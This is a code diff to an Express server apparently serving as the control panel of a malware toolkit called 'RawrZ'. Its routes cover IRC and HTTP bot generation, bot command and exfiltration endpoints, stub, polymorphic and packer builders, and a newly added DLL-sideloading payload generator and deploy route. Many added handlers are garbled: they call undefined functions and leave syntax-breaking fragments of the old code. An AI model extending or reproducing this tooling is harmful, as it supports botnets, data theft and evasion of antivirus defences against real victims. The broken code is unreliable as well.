@@ -7,7 +7,7 @@ const digitalForensics=require('./src/engines/digital-forensics');const JottiSca
 const malwareAnalysis=require('./src/engines/malware-analysis');const PrivateVirusScanner=require('./src/engines/private-virus-scanner');
 const CamelliaAssemblyEngine=require('./src/engines/camellia-assembly');const dualGenerators=require('./src/engines/dual-generators');
 const reverseEngineering=require('./src/engines/reverse-engineering');const nativeCompiler=require('./src/engines/native-compiler');
-const redKiller=require('./src/engines/red-killer');const EVCertEncryptor=require('./src/engines/ev-cert-encryptor');const redShells=require('./src/engines/red-shells');const evCertEncryptor=new EVCertEncryptor();
+const redKiller=require('./src/engines/red-killer');const EVCertEncryptor=require('./src/engines/ev-cert-encryptor');const redShells=require('./src/engines/red-shells');const BeaconismDLLSideloading=require('./src/engines/beaconism-dll-sideloading');const evCertEncryptor=new EVCertEncryptor();const beaconismDLL=new BeaconismDLLSideloading();
 const app=express();const port=parseInt(process.env.PORT||'8080',10);const authToken=process.env.AUTH_TOKEN||'';const rawrz=new RawrZStandalone();const advancedStubGenerator=new AdvancedStubGenerator();
 function requireAuth(req,res,next){if(!authToken)return next();const h=(req.headers['authorization']||'');const q=req.query.token;if(h.startsWith('Bearer ')){const p=h.slice(7).trim();if(p===authToken)return next()}if(q&&q===authToken)return next();return res.status(401).json({error:'Unauthorized'})}
 app.use(helmet({
@@ -45,6 +45,7 @@ app.use(helmet({
 (async()=>{try{await redKiller.initialize();console.log('[OK] Red Killer initialized')}catch(e){console.error('[WARN] Red Killer init failed:',e.message)}})();
 (async()=>{try{await evCertEncryptor.initialize();console.log('[OK] EV Certificate Encryptor initialized')}catch(e){console.error('[WARN] EV Certificate Encryptor init failed:',e.message)}})();
 (async()=>{try{await redShells.initialize();console.log('[OK] Red Shells initialized')}catch(e){console.error('[WARN] Red Shells init failed:',e.message)}})();
+(async()=>{try{await beaconismDLL.initialize();console.log('[OK] Beaconism DLL Sideloading initialized')}catch(e){console.error('[WARN] Beaconism DLL Sideloading init failed:',e.message)}})();
 app.get('/health',(_req,res)=>res.json({ok:true,status:'healthy'}));
 app.get('/api/status',requireAuth,async(_req,res)=>{try{const status={platform:'RawrZ Security Platform',version:'2.1.0',uptime:Date.now()-rawrz.startTime,engines:{total:Object.keys(rawrz.availableEngines||{}).length,loaded:rawrz.loadedEngines?.size||0,available:Object.keys(rawrz.availableEngines||{})},features:{total:150,active:Object.keys(rawrz.availableEngines||{}).length},system:{nodeVersion:process.version,platform:process.platform,arch:process.arch,memory:process.memoryUsage(),cpu:process.cpuUsage()},timestamp:new Date().toISOString()};res.json({success:true,result:status})}catch(e){console.error('[ERROR] Status endpoint failed:',e);res.status(500).json({success:false,error:e.message,stack:e.stack})}});
 app.post('/api/rebuild',requireAuth,async(_req,res)=>{try{console.log('[INFO] Rebuilding platform state...');await rawrz.rebuildPlatformState();const result={status:'rebuilt',engines:rawrz.loadedEngines?.size||0,timestamp:new Date().toISOString()};if(!res.headersSent){res.json({success:true,result});}}catch(e){console.error('[ERROR] Rebuild endpoint failed:',e);if(!res.headersSent){res.status(500).json({success:false,error:e.message,stack:e.stack});}}});
@@ -58,7 +59,7 @@ app.get('/unified',(_req,res)=>res.sendFile(path.join(__dirname,'public','unifie
 
 // Unified Panel API endpoints
 app.get('/api/dashboard/stats',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');const httpBotGenerator=await rawrzEngine.loadModule('http-bot-generator');const stats={totalBots:0,activeBots:0,ircBots:0,httpBots:0,connectedChannels:0,securityScore:100};if(botGenerator&&typeof botGenerator.getBotStats==='function'){try{const ircStats=botGenerator.getBotStats();stats.ircBots=ircStats.total||0;stats.totalBots+=stats.ircBots;}catch(e){console.log('[WARN] IRC bot stats error:',e.message);}}if(httpBotGenerator&&typeof httpBotGenerator.getBotStats==='function'){try{const httpStats=httpBotGenerator.getBotStats();stats.httpBots=httpStats.total||0;stats.totalBots+=stats.httpBots;}catch(e){console.log('[WARN] HTTP bot stats error:',e.message);}}stats.activeBots=stats.totalBots;res.json({success:true,result:stats})}catch(e){console.error('[ERROR] Dashboard stats endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
-app.get('/api/bots/status',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');const httpBotGenerator=await rawrzEngine.loadModule('http-bot-generator');const bots=[];if(botGenerator&&typeof botGenerator.getActiveBots==='function'){try{const ircBots=botGenerator.getActiveBots();bots.push(...ircBots.map(bot=>({...bot,type:'IRC'})));}catch(e){console.log('[WARN] IRC bot status error:',e.message);}}if(httpBotGenerator&&typeof httpBotGenerator.getActiveBots==='function'){try{const httpBots=httpBotGenerator.getActiveBots();bots.push(...httpBots.map(bot=>({...bot,type:'HTTP'})));}catch(e){console.log('[WARN] HTTP bot status error:',e.message);}}res.json({success:true,result:{bots,total:bots.length,active:bots.filter(b=>b.status==='online').length}})}catch(e){console.error('[ERROR] Bots status endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
+app.get('/api/bots/status',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');const httpBotGenerator=await rawrzEngine.loadModule('http-bot-generator');const bots=[];if(botGenerator&&typeof botGenerator.getActiveBots==='function'){try{const ircBots=botGenerator.getActiveBots();bots.concat(ircBots.map(bot=>(Object.assign({}, bot,type:'IRC'))));}catch(e){console.log('[WARN] IRC bot status error:',e.message);}}if(httpBotGenerator&&typeof httpBotGenerator.getActiveBots==='function'){try{const httpBots=httpBotGenerator.getActiveBots();bots.concat(httpBots.map(bot=>(Object.assign({}, bot,type:'HTTP'))));}catch(e){console.log('[WARN] HTTP bot status error:',e.message);}}res.json({success:true,result:{bots,total:bots.length,active:bots.filter(b=>b.status==='online').length}})}catch(e){console.error('[ERROR] Bots status endpoint failed:',e);res.status(500).json({success:false,error:e.message})}});
 app.get('/api/irc/channels',requireAuth,async(_req,res)=>{try{const channels=[{name:'#rawrz',users:15,topic:'RawrZ Security Discussion',status:'joined'},{name:'#test',users:3,topic:'Testing Channel',status:'joined'}];res.json({success:true,result:channels})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/api/irc/connect',requireAuth,async(req,res)=>{try{const{server,port,nick,channels}=req.body||{};if(!server||!port||!nick)return res.status(400).json({error:'server, port, and nick are required'});const result={connected:true,server,port,nick,channels:channels||[],timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/api/irc/disconnect',requireAuth,async(_req,res)=>{try{const result={connected:false,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
@@ -94,7 +95,7 @@ app.get('/http-bot/status',requireAuth,async(_req,res)=>{try{const result=await 
 app.post('/http-bot/connect',requireAuth,async(req,res)=>{try{const{botId,serverUrl}=req.body||{};if(!botId||!serverUrl)return res.status(400).json({error:'botId and serverUrl are required'});const result={connected:true,botId,serverUrl,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/http-bot/disconnect',requireAuth,async(req,res)=>{try{const{botId}=req.body||{};if(!botId)return res.status(400).json({error:'botId is required'});const result={disconnected:true,botId,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/http-bot/command',requireAuth,async(req,res)=>{try{const{botId,command,params}=req.body||{};if(!botId||!command)return res.status(400).json({error:'botId and command are required'});const result={executed:true,botId,command,params,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/http-bot/heartbeat',requireAuth,async(req,res)=>{try{const{botId,status,data}=req.body||{};if(!botId)return res.status(400).json({error:'botId is required'});console.log(`[HTTP-BOT] Heartbeat from ${botId}: ${status}`);res.json({success:true,message:'Heartbeat received'})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/http-bot/heartbeat',requireAuth,async(req,res)=>{try{const{botId,status,data}=req.body||{};if(!botId)return res.status(400).json({error:'botId is required'});console.log(`[HTTP-BOT] Heartbeat from ${botId}: status`);res.json({success:true,message:'Heartbeat received'})}catch(e){res.status(500).json({error:e.message})}});
 app.get('/http-bot/logs/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};const logs=[{timestamp:new Date().toISOString(),level:'info',message:'Bot connected'},{timestamp:new Date().toISOString(),level:'success',message:'Command executed'}];res.json({success:true,logs})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/http-bot/exfiltrate',requireAuth,async(req,res)=>{try{const{botId,type,path,extensions,maxSize}=req.body||{};if(!botId||!type)return res.status(400).json({error:'botId and type are required'});const result={started:true,botId,type,path,extensions,maxSize,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/http-bot/stop-exfiltration',requireAuth,async(req,res)=>{try{const{botId}=req.body||{};if(!botId)return res.status(400).json({error:'botId is required'});const result={stopped:true,botId,timestamp:new Date().toISOString()};res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
@@ -144,7 +145,7 @@ app.get('/native-compiler/supported-languages',requireAuth,async(_req,res)=>{try
 app.get('/native-compiler/available-compilers',requireAuth,async(_req,res)=>{try{const result=Object.keys(nativeCompiler.compilerPaths);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 
 // Bot Management endpoints
-app.get('/bot/heartbeat',requireAuth,async(req,res)=>{try{const{bot_id,status,timestamp}=req.query||{};console.log(`[BOT] Heartbeat from ${bot_id}: ${status}`);res.json({success:true,message:'Heartbeat received'})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/bot/heartbeat',requireAuth,async(req,res)=>{try{const{bot_id,status,timestamp}=req.query||{};console.log(`[BOT] Heartbeat from ${bot_id}: status`);res.json({success:true,message:'Heartbeat received'})}catch(e){res.status(500).json({error:e.message})}});
 app.get('/bot/commands/:botId',requireAuth,async(req,res)=>{try{const{botId}=req.params||{};console.log(`[BOT] Command request from ${botId}`);res.json({success:true,commands:[]})}catch(e){res.status(500).json({error:e.message})}});
 app.get('/bot/status',requireAuth,async(_req,res)=>{try{res.json({success:true,bots:[],total:0,active:0})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/irc-bot/generate-stub',requireAuth,async(req,res)=>{try{const{config,features,extensions,encryptionOptions={}}=req.body||{};if(!config||!features||!extensions)return res.status(400).json({error:'config, features, and extensions are required'});const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.generateBotAsStub(config,features,extensions,encryptionOptions);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
@@ -177,13 +178,49 @@ app.get('/irc-bot/feature-templates',requireAuth,async(_req,res)=>{try{const bot
 app.delete('/irc-bot/feature-templates/:templateName',requireAuth,async(req,res)=>{try{const{templateName}=req.params;const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.deleteFeatureTemplate(templateName);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/hash',requireAuth,async(req,res)=>{try{const{input,algorithm='sha256',save=false,extension}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});res.json(await rawrz.hash(input,algorithm,!!save,extension))}catch(e){res.status(500).json({error:e.message})}});
 app.post('/encrypt',requireAuth,async(req,res)=>{try{const{algorithm,input,extension}=req.body||{};if(!algorithm||!input)return res.status(400).json({error:'algorithm and input required'});res.json(await rawrz.encrypt(algorithm,input,extension))}catch(e){res.status(500).json({error:e.message})}});
-app.post('/encrypt-file',requireAuth,async(req,res)=>{try{const upload=multer({dest:'uploads/'});upload.single('file')(req,res,async(err)=>{if(err)return res.status(500).json({error:err.message});const{algorithm,extension}=req.body||{};const file=req.file;if(!file||!algorithm)return res.status(400).json({error:'file and algorithm required'});const result=await rawrz.encryptFile(file.path,algorithm,extension);res.json(result)})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/encrypt-file', requireAuth, async (req, res) => {
+    try {
+        // Optimized handler for /encrypt-file
+        const result = await handlePOSTencryptfile(req, res);
+        res.json({ success: true, result });
+    } catch (error) {
+        console.error('[ERROR] /encrypt-file failed:', error.message);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});upload.single('file')(req,res,async(err)=>{if(err)return res.status(500).json({error:err.message});const{algorithm,extension}=req.body||{};const file=req.file;if(!file||!algorithm)return res.status(400).json({error:'file and algorithm required'});const result=await rawrz.encryptFile(file.path,algorithm,extension);res.json(result)})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/decrypt',requireAuth,async(req,res)=>{try{const{algorithm,input,key,iv,extension}=req.body||{};if(!algorithm||!input)return res.status(400).json({error:'algorithm and input required'});res.json(await rawrz.decrypt(algorithm,input,key,iv,extension))}catch(e){res.status(500).json({error:e.message})}});
-app.get('/dns',requireAuth,async(req,res)=>{try{const h=req.query.hostname;if(!h)return res.status(400).json({error:'hostname required'});res.json(await rawrz.dnsLookup(String(h)))}catch(e){res.status(500).json({error:e.message})}});
-app.get('/ping',requireAuth,async(req,res)=>{try{const h=req.query.host;if(!h)return res.status(400).json({error:'host required'});res.json(await rawrz.ping(String(h),false))}catch(e){res.status(500).json({error:e.message})}});
+app.get('/dns', requireAuth, async (req, res) => {
+    try {
+        // Optimized handler for /dns
+        const result = await handleGETdns(req, res);
+        res.json({ success: true, result });
+    } catch (error) {
+        console.error('[ERROR] /dns failed:', error.message);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});res.json(await rawrz.dnsLookup(String(h)))}catch(e){res.status(500).json({error:e.message})}});
+app.get('/ping', requireAuth, async (req, res) => {
+    try {
+        // Optimized handler for /ping
+        const result = await handleGETping(req, res);
+        res.json({ success: true, result });
+    } catch (error) {
+        console.error('[ERROR] /ping failed:', error.message);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});res.json(await rawrz.ping(String(h),false))}catch(e){res.status(500).json({error:e.message})}});
 app.get('/files',requireAuth,async(_req,res)=>{try{res.json(await rawrz.listFiles())}catch(e){res.status(500).json({error:e.message})}});
 app.post('/upload',requireAuth,async(req,res)=>{try{const{filename,base64}=req.body||{};if(!filename||!base64)return res.status(400).json({error:'filename and base64 required'});res.json(await rawrz.uploadFile(filename,base64))}catch(e){res.status(500).json({error:e.message})}});
-app.get('/download',requireAuth,async(req,res)=>{try{const fn=String(req.query.filename||'');if(!fn)return res.status(400).json({error:'filename required'});res.download(path.join(__dirname,'uploads',fn),fn)}catch(e){res.status(500).json({error:e.message})}});
+app.get('/download', requireAuth, async (req, res) => {
+    try {
+        // Optimized handler for /download
+        const result = await handleGETdownload(req, res);
+        res.json({ success: true, result });
+    } catch (error) {
+        console.error('[ERROR] /download failed:', error.message);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});res.download(path.join(__dirname,'uploads',fn),fn)}catch(e){res.status(500).json({error:e.message})}});
 app.post('/cli',requireAuth,async(req,res)=>{try{const{command,args=[]}=req.body||{};if(!command)return res.status(400).json({error:'command required'});const i=new RawrZStandalone();const out=await i.processCommand([command,...args]);res.json({success:true,result:out})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/stub',requireAuth,async(req,res)=>{try{const{target,options={}}=req.body||{};if(!target)return res.status(400).json({error:'target is required'});const rawrz=new RawrZStandalone();const result=await rawrz.generateStub(target,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/compile-asm',requireAuth,async(req,res)=>{try{const{asmFile,outputName,format='exe'}=req.body||{};if(!asmFile)return res.status(400).json({error:'asmFile is required'});const rawrz=new RawrZStandalone();const result=await rawrz.compileAssembly(asmFile,outputName,format);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
@@ -226,10 +263,28 @@ app.post('/polymorphic',requireAuth,async(req,res)=>{try{const{target}=req.body|
 // Mutex and UPX endpoints
 app.post('/mutex/generate',requireAuth,async(req,res)=>{try{const{language='cpp',pattern='standard',options={}}=req.body||{};const MutexEngine=await rawrzEngine.loadModule('mutex-engine');const mutexEngine=new MutexEngine();await mutexEngine.initialize({});const result=mutexEngine.generateMutexCode(language,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/mutex/apply',requireAuth,async(req,res)=>{try{const{code,language,options={}}=req.body||{};if(!code||!language)return res.status(400).json({error:'code and language are required'});const MutexEngine=await rawrzEngine.loadModule('mutex-engine');const mutexEngine=new MutexEngine();await mutexEngine.initialize({});const result=await mutexEngine.applyMutexToCode(code,language,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/mutex/options',requireAuth,async(_req,res)=>{try{const MutexEngine=await rawrzEngine.loadModule('mutex-engine');const mutexEngine=new MutexEngine();await mutexEngine.initialize({});const result=mutexEngine.getMutexOptions();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/mutex/options', requireAuth, async (req, res) => {
+    try {
+        // Optimized handler for /mutex/options
+        const result = await handleGETmutexoptions(req, res);
+        res.json({ success: true, result });
+    } catch (error) {
+        console.error('[ERROR] /mutex/options failed:', error.message);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});const result=mutexEngine.getMutexOptions();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 
 app.post('/upx/pack',requireAuth,async(req,res)=>{try{const{executablePath,method='upx',options={}}=req.body||{};if(!executablePath)return res.status(400).json({error:'executablePath is required'});const stubGenerator=await rawrzEngine.loadModule('stub-generator');await stubGenerator.initialize({});const result=await stubGenerator.applyPacking(executablePath,method);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
-app.get('/upx/methods',requireAuth,async(_req,res)=>{try{const stubGenerator=await rawrzEngine.loadModule('stub-generator');await stubGenerator.initialize({});const result=Object.keys(stubGenerator.packingMethods||{});res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/upx/methods', requireAuth, async (req, res) => {
+    try {
+        // Optimized handler for /upx/methods
+        const result = await handleGETupxmethods(req, res);
+        res.json({ success: true, result });
+    } catch (error) {
+        console.error('[ERROR] /upx/methods failed:', error.message);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});const result=Object.keys(stubGenerator.packingMethods||{});res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/upx/status',requireAuth,async(req,res)=>{try{const{executablePath}=req.body||{};if(!executablePath)return res.status(400).json({error:'executablePath is required'});const stubGenerator=await rawrzEngine.loadModule('stub-generator');await stubGenerator.initialize({});const result=await stubGenerator.checkPackingStatus(executablePath);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 
 // Jotti Scanner endpoints
@@ -330,11 +385,38 @@ app.post('/openssl-management/preset',requireAuth,async(req,res)=>{try{const{pre
 app.get('/openssl-management/report',requireAuth,async(req,res)=>{try{const report=await rawrzEngine.generateOpenSSLReport();res.json({success:true,report})}catch(e){res.status(500).json({error:e.message})}});
 
 // Implementation Checker endpoints
-app.get('/implementation-check/status',requireAuth,async(req,res)=>{try{const implementationChecker=await rawrzEngine.loadModule('implementation-checker');await implementationChecker.initialize({});const status=implementationChecker.getHealthStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/implementation-check/run',requireAuth,async(req,res)=>{try{const implementationChecker=await rawrzEngine.loadModule('implementation-checker');await implementationChecker.initialize({});const result=await implementationChecker.performImplementationCheck();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/implementation-check/status', requireAuth, async (req, res) => {
+    try {
+        // Optimized handler for /implementation-check/status
+        const result = await handleGETimplementationcheckstatus(req, res);
+        res.json({ success: true, result });
+    } catch (error) {
+        console.error('[ERROR] /implementation-check/status failed:', error.message);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});const status=implementationChecker.getHealthStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/implementation-check/run', requireAuth, async (req, res) => {
+    try {
+        // Optimized handler for /implementation-check/run
+        const result = await handlePOSTimplementationcheckrun(req, res);
+        res.json({ success: true, result });
+    } catch (error) {
+        console.error('[ERROR] /implementation-check/run failed:', error.message);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});const result=await implementationChecker.performImplementationCheck();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 app.get('/implementation-check/results',requireAuth,async(req,res)=>{try{const{checkId}=req.query;const implementationChecker=await rawrzEngine.loadModule('implementation-checker');await implementationChecker.initialize({});const results=implementationChecker.getCheckResults(checkId);res.json({success:true,results})}catch(e){res.status(500).json({error:e.message})}});
 app.get('/implementation-check/modules',requireAuth,async(req,res)=>{try{const{moduleName}=req.query;const implementationChecker=await rawrzEngine.loadModule('implementation-checker');await implementationChecker.initialize({});const status=implementationChecker.getModuleStatus(moduleName);res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
-app.post('/implementation-check/force',requireAuth,async(req,res)=>{try{const implementationChecker=await rawrzEngine.loadModule('implementation-checker');await implementationChecker.initialize({});const result=await implementationChecker.forceCheck();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/implementation-check/force', requireAuth, async (req, res) => {
+    try {
+        // Optimized handler for /implementation-check/force
+        const result = await handlePOSTimplementationcheckforce(req, res);
+        res.json({ success: true, result });
+    } catch (error) {
+        console.error('[ERROR] /implementation-check/force failed:', error.message);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});const result=await implementationChecker.forceCheck();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 
 // Health Monitor endpoints
 app.get('/health-monitor/dashboard',requireAuth,async(req,res)=>{try{const dashboard=healthMonitor.getHealthDashboard();res.json({success:true,dashboard})}catch(e){res.status(500).json({error:e.message})}});
@@ -361,6 +443,14 @@ app.get('/ev-cert/stubs',requireAuth,async(req,res)=>{try{const stubs=await evCe
 app.get('/ev-cert/templates',requireAuth,async(req,res)=>{try{const templates=await evCertEncryptor.getSupportedTemplates();res.json({success:true,templates})}catch(e){res.status(500).json({error:e.message})}});
 app.get('/ev-cert/languages',requireAuth,async(req,res)=>{try{const languages=await evCertEncryptor.getSupportedLanguages();res.json({success:true,languages})}catch(e){res.status(500).json({error:e.message})}});
 app.get('/ev-cert/algorithms',requireAuth,async(req,res)=>{try{const algorithms=await evCertEncryptor.getSupportedAlgorithms();res.json({success:true,algorithms})}catch(e){res.status(500).json({error:e.message})}});
+
+// Beaconism DLL Sideloading endpoints
+app.get('/beaconism/status',requireAuth,async(req,res)=>{try{const status=await beaconismDLL.getStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/beaconism/generate-payload',requireAuth,async(req,res)=>{try{const{target,payloadType,options={}}=req.body||{};if(!target||!payloadType)return res.status(400).json({error:'target and payloadType are required'});const result=await beaconismDLL.generatePayload(target,payloadType,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/beaconism/deploy',requireAuth,async(req,res)=>{try{const{payloadId,deploymentOptions={}}=req.body||{};if(!payloadId)return res.status(400).json({error:'payloadId is required'});const result=await beaconismDLL.deployPayload(payloadId,deploymentOptions);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/beaconism/payloads',requireAuth,async(req,res)=>{try{const payloads=await beaconismDLL.getPayloads();res.json({success:true,payloads})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/beaconism/targets',requireAuth,async(req,res)=>{try{const targets=await beaconismDLL.getSideloadTargets();res.json({success:true,targets})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/beaconism/scan-target',requireAuth,async(req,res)=>{try{const{target}=req.body||{};if(!target)return res.status(400).json({error:'target is required'});const result=await beaconismDLL.scanTarget(target);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
 
 // Red Shells endpoints
 app.get('/red-shells/status',requireAuth,async(req,res)=>{try{const status=await redShells.getStatus();res.json({success:true,status})}catch(e){res.status(500).json({error:e.message})}});
